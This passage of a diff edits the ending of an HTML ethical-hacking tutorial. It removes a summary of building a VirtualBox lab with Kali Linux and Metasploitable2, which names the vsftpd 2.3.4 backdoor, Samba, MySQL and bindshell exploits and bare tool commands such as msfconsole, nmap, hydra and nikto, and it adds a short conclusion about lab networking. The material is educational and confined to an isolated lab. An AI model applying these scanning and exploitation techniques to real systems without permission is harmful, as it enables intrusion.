-                                <tr>
-                                    <th>Skill</th>
-                                    <th>Resource</th>
-                                    <th>Type</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td><strong>More Metasploitable2 exploits</strong></td>
-                                    <td><a href="docs.rapid7.com/metasploit/metasploitable-2"
-                                            class="link">docs.rapid7.com/metasploit/metasploitable-2</a></td>
-                                    <td>Free docs</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Web app hacking (DVWA)</strong></td>
-                                    <td>DVWA at http://192.168.56.102/dvwa</td>
-                                    <td>In your lab</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Guided beginner challenges</strong></td>
-                                    <td><a href="https://tryhackme.com" class="link">tryhackme.com</a></td>
-                                    <td>Free + Paid</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>OSCP preparation</strong></td>
-                                    <td><a href="https://www.offsec.com/courses/pen-200/"
-                                            class="link">offensive-security.com/pwk-oscp</a></td>
-                                    <td>Paid certification</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>CEH preparation</strong></td>
-                                    <td><a href="https://www.eccouncil.org/train-certify/certified-ethical-hacker-ceh/"
-                                            class="link">eccouncil.org/train-certify/certified-ethical-hacker-ceh</a>
-                                    </td>
-                                    <td>Paid certification</td>
-                                </tr>
-                                <tr>
-                                    <td><strong>Metasploit documentation</strong></td>
-                                    <td><a href="https://docs.metasploit.com" class="link">docs.metasploit.com</a></td>
-                                    <td>Free</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-                </div>
-                <div class="content">
-                    <h3>Conclusion</h3>
-                    <p>By the end of this tutorial, you have built a fully isolated ethical hacking lab using
-                        VirtualBox, Kali Linux, and
-                        Metasploitable2, verified network connectivity, performed reconnaissance with Nmap, exploited
-                        intentionally vulnerable
-                        services, and extended the lab with DVWA for web security practice. More importantly, this setup
-                        gives you a safe and
-                        legal place to learn how real attacks work, from service enumeration to root access and basic
-                        reporting, without
-                        touching live systems.</p>
-                    <p>Click to <a href="images/ethical-hacking-lab-workflow.webp" class="link">Download</a> (image) the
-                        Ethical
-                        hacking Practice Workflow in Personal Lab.
+                    <p>You went from "why can't my VMs ping each other?" to having a fully documented, scriptable,
+                        secure, multi-topology lab
+                        network — the same level of understanding a professional penetration tester uses when building
+                        client lab environments.
                     </p>
-
-                    <div class="table-container">
-                        <h4>What You Accomplished</h4>
-                        <p>Look at everything you built and learned in this single tutorial:</p>
-                        <table>
-                            <thead>
-                                <tr>
-                                    <th>Step</th>
-                                    <th>What You Did</th>
-                                    <th>Skill Gained</th>
-                                </tr>
-                            </thead>
-                            <tbody>
-                                <tr>
-                                    <td>Step 1</td>
-                                    <td>Installed VirtualBox</td>
-                                    <td>Hypervisor + VM management</td>
-                                </tr>
-                                <tr>
-                                    <td>Step 2</td>
-                                    <td>Imported Kali Linux VM</td>
-                                    <td>Attacker OS setup</td>
-                                </tr>
-                                <tr>
-                                    <td>Step 3</td>
-                                    <td>Imported Metasploitable2</td>
-                                    <td>Vulnerable target setup</td>
-                                </tr>
-                                <tr>
-                                    <td>Step 4</td>
-                                    <td>Configured Host-Only Network</td>
-                                    <td>Isolated lab networking</td>
-                                </tr>
-                                <tr>
-                                    <td>Step 5</td>
-                                    <td>Verified connectivity with ping</td>
-                                    <td>Network troubleshooting</td>
-                                </tr>
-                                <tr>
-                                    <td>Step 6</td>
-                                    <td>Ran Nmap reconnaissance scan</td>
-                                    <td>Professional recon technique</td>
-                                </tr>
-                                <tr>
-                                    <td>Step 7</td>
-                                    <td>Exploited vsftpd 2.3.4 backdoor</td>
-                                    <td>Real CVE exploitation + Metasploit</td>
-                                </tr>
-                                <tr>
-                                    <td>Step 8</td>
-                                    <td>Samba, MySQL, bindshell exploits</td>
-                                    <td>3 more attack techniques</td>
-                                </tr>
-                                <tr>
-                                    <td>Step 9</td>
-                                    <td>Accessed DVWA web app</td>
-                                    <td>Web vulnerability practice</td>
-                                </tr>
-                                <tr>
-                                    <td>Step 10</td>
-                                    <td>Wrote a pentest report</td>
-                                    <td>Portfolio documentation</td>
-                                </tr>
-                            </tbody>
-                        </table>
-                    </div>
-                    <h4>The Bigger Picture — What This Really Means</h4>
-                    <p>Every command you ran in this lab maps directly to real-world penetration testing methodology:
+                    <p>Your lab is properly isolated. Your Kali has internet. Your Metasploitable is locked down. Start
+                        hacking.
                     </p>
-                    <div class="bg-color">
-                        <pre>
-Reconnaissance  → nmap -sV        (discover what's running)
-      ↓
-Exploitation    → msfconsole      (gain access)
-      ↓
-Post-Exploit    → id, whoami      (confirm access level)
-      ↓
-Documentation   → pentest report  (professional deliverable)
-</pre>
-                    </div>
-                    <p>This is the exact workflow used in real engagements — you just followed the same process on a
-                        safe, legal target.</p>
-                    <h4>Your Lab Is Permanent — Keep Using It</h4>
-                    <p>This lab does not expire. Every time you learn a new tool or technique, come back and test it
-                        here:
-                    </p>
-                    <div class="bg-color">
-                        <pre>
-# Your lab is always one command away
-# Start Metasploitable2 in VirtualBox
-# Start Kali Linux in VirtualBox
-# Open terminal in Kali
-
-msfconsole        # practice new exploits
-nmap -sV target   # practice recon
-hydra             # practice brute forcing
-nikto -h target   # practice web scanning
-</pre>
-                    </div>
-                    <p>Take a VirtualBox snapshot of both VMs right now — it lets you restore to a clean state in 30
-                        seconds whenever you break
-                        something.</p>
-                    <p>Setting up this lab puts you ahead of the majority of cybersecurity beginners who only watch
-                        tutorials without ever
-                        running a real command. You did not just read about exploitation — you did it.</p>
-                    <p>The difference between a cybersecurity professional and someone who watches YouTube videos is
-                        simple: hands-on practice
-                        in a real environment. You now have that environment, permanently, for free.</p>
-                    <p><strong>Keep breaking things. Keep learning. Keep documenting.</strong></p>
-                    <p>Your next exploit is one <code class="code">msfconsole</code> away. 🚀</p>
                     <div class="pro-tips">
-                        <p>💡 Found this tutorial helpful? Share it with someone learning ethical hacking.
-                            Every professional started exactly where
-                            you are right now — with a blank terminal and curiosity.</p>
+                        <p>💡 Found this guide useful? Share it with someone who is stuck on VirtualBox network
+                            configuration — it's the most
+                            common unspoken barrier for beginners entering ethical hacking.</p>
                     </div>
                 </div>
             </div>
+
+
             <div class="next-section">
+                <div class="next">
+                    <div class="header">
+                        <h3>Setup a Personal Cybersecurity Lab with Virtualbox, Kali Linux and Metasploitable2</h3>
+                        <p class="tag">Tutorial</p>
+
+                    </div>
+                    <div class="content">
+                        <p>Build a beginner ethical hacking lab using VirtualBox, Kali Linux, and Metasploitable 2.
+                            Learn setup, scanning,
+                            exploitation, and safe penetration testing practice.
+                        </p>
+                        <a href="../set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2/set-up-ethical-hacking-lab-virtualbox-kali-linux-metasploitable2.html"
+                            class="next-button">Go To
+                            Tutorial</a>
+                    </div>
+                </div>
+
                 <div class="next">
                     <div class="header">
                         <h3>Linux Module 1: Advanced Command-Line Navigation & File System Operations</h3>
@@ -2318,35 +2019,6 @@ nikto -h target   # practice web scanning
                                 Tools</a> <span class="blink">_</span>
                         </span>
                     </div>
-                </div>
-            </div>
-            <div class="wallpaper">
-                <div>
-                    <h3>Featured Wallpapers (For desktop)</h3>
-                    <p>Download for FREE!</p>
-                </div>
-                <div class="image-grid">
-                    <div class="image-card">
-                        <img src="../../../Wallpaper/images_upscale/wallpaper (1).png" alt="Wallpaper 1">
-                    </div>
-                    <div class="image-card">
-                        <img src="../../../Wallpaper/images_upscale/wallpaper (23).png" alt="Wallpaper 23">
-                    </div>
-                    <div class="image-card">
-                        <img src="../../../Wallpaper/images_upscale/wallpaper (46).png" alt="Wallpaper 46">
-                    </div>
-                    <div class="image-card">
-                        <img src="../../../Wallpaper/images_upscale/wallpaper (81).png" alt="Wallpaper 81">
-                    </div>
-                    <div class="image-card">
-                        <img src="../../../Wallpaper/images_upscale/wallpaper (111).png" alt="Wallpaper 111">
-                    </div>
-                    <div class="image-card">
-                        <img src="../../../Wallpaper/images_upscale/wallpaper (116).png" alt="Wallpaper 116">
-                    </div>
-                </div>
-                <div class="button">
-                    <a href="../../../Wallpaper/index.html" class="wallpaper-button">Go To Wallpaper Home Page</a>
                 </div>
             </div>
 
